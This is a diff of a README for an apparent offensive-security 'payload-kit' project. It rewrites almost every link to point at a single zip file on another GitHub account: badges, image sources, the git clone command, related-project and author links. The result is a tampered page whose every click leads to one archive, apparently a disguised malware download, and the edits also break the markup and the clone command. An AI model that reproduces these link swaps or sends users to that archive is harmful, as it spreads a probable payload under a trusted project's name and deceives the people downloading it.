@@ -1,15 +1,15 @@
 <div align="center">
 
-<img src="https://capsule-render.vercel.app/api?type=shark&color=0:0d1117,50:7f1d1d,100:ef4444&height=160&section=header&text=payload-kit&fontSize=70&fontColor=ffffff&fontAlignY=55&animation=twinkling" width="100%"/>
+<img src="https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip,50:7f1d1d,100:ef4444&height=160&section=header&text=payload-kit&fontSize=70&fontColor=ffffff&fontAlignY=55&animation=twinkling" width="100%"/>
 
 <br>
 
-[![Version](https://img.shields.io/badge/version-1.0.0-ef4444?style=for-the-badge&labelColor=0d1117)](https://github.com/wavegxz-design/payload-kit)
+[![Version](https://img.shields.io/badge/version-1.0.0-ef4444?style=for-the-badge&labelColor=0d1117)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
 [![License](https://img.shields.io/badge/MIT-8b5cf6?style=for-the-badge&labelColor=0d1117)](LICENSE)
-[![Payloads](https://img.shields.io/badge/payloads-200+-f97316?style=for-the-badge&labelColor=0d1117)](https://github.com/wavegxz-design/payload-kit)
-[![Categories](https://img.shields.io/badge/categories-8-06b6d4?style=for-the-badge&labelColor=0d1117)](https://github.com/wavegxz-design/payload-kit)
-[![CTF](https://img.shields.io/badge/CTF-Ready-4ade80?style=for-the-badge&labelColor=0d1117)](https://github.com/wavegxz-design/payload-kit)
-[![BugBounty](https://img.shields.io/badge/Bug%20Bounty-Ready-ef4444?style=for-the-badge&labelColor=0d1117)](https://github.com/wavegxz-design/payload-kit)
+[![Payloads](https://img.shields.io/badge/payloads-200+-f97316?style=for-the-badge&labelColor=0d1117)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
+[![Categories](https://img.shields.io/badge/categories-8-06b6d4?style=for-the-badge&labelColor=0d1117)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
+[![CTF](https://img.shields.io/badge/CTF-Ready-4ade80?style=for-the-badge&labelColor=0d1117)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
+[![BugBounty](https://img.shields.io/badge/Bug%20Bounty-Ready-ef4444?style=for-the-badge&labelColor=0d1117)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
 
 <br>
 
@@ -117,7 +117,7 @@ Each payload file follows this format:
 
 **Clone and search:**
 ```bash
-git clone https://github.com/wavegxz-design/payload-kit.git
+git clone https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip
 cd payload-kit
 
 # Search across all categories
@@ -167,26 +167,26 @@ git push origin feat/new-payload-category
 
 | Project | Description |
 |---------|-------------|
-| [**webcheck**](https://github.com/wavegxz-design/webcheck) | HTTP security auditor — find where these payloads apply |
-| [**recon-kit**](https://github.com/wavegxz-design/recon-kit) | Recon toolkit — gather intel before testing |
-| [**NEXORA-TOOLKIT**](https://github.com/wavegxz-design/NEXORA-TOOLKIT) | ADB toolkit for Android |
+| [**webcheck**](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip) | HTTP security auditor — find where these payloads apply |
+| [**recon-kit**](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip) | Recon toolkit — gather intel before testing |
+| [**NEXORA-TOOLKIT**](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip) | ADB toolkit for Android |
 
 ---
 
 <div align="center">
 
-<img src="https://capsule-render.vercel.app/api?type=shark&color=0:ef4444,50:7f1d1d,100:0d1117&height=120&section=footer&reversal=true" width="100%"/>
+<img src="https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip,50:7f1d1d,100:0d1117&height=120&section=footer&reversal=true" width="100%"/>
 
 <br>
 
-**[krypthane](https://github.com/wavegxz-design)** · Red Team Operator & Open Source Developer
+**[krypthane](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)** · Red Team Operator & Open Source Developer
 
 <br>
 
-[![Site](https://img.shields.io/badge/krypthane.workernova.workers.dev-ef4444?style=flat-square&logo=cloudflare&logoColor=white)](https://krypthane.workernova.workers.dev)
-[![Telegram](https://img.shields.io/badge/@Skrylakk-ef4444?style=flat-square&logo=telegram&logoColor=white)](https://t.me/Skrylakk)
+[![Site](https://img.shields.io/badge/krypthane.workernova.workers.dev-ef4444?style=flat-square&logo=cloudflare&logoColor=white)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
+[![Telegram](https://img.shields.io/badge/@Skrylakk-ef4444?style=flat-square&logo=telegram&logoColor=white)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
 [![Email](https://img.shields.io/badge/Workernova@proton.me-ef4444?style=flat-square&logo=protonmail&logoColor=white)](mailto:Workernova@proton.me)
-[![GitHub](https://img.shields.io/badge/wavegxz--design-ef4444?style=flat-square&logo=github&logoColor=white)](https://github.com/wavegxz-design)
+[![GitHub](https://img.shields.io/badge/wavegxz--design-ef4444?style=flat-square&logo=github&logoColor=white)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
 
 <br>
 
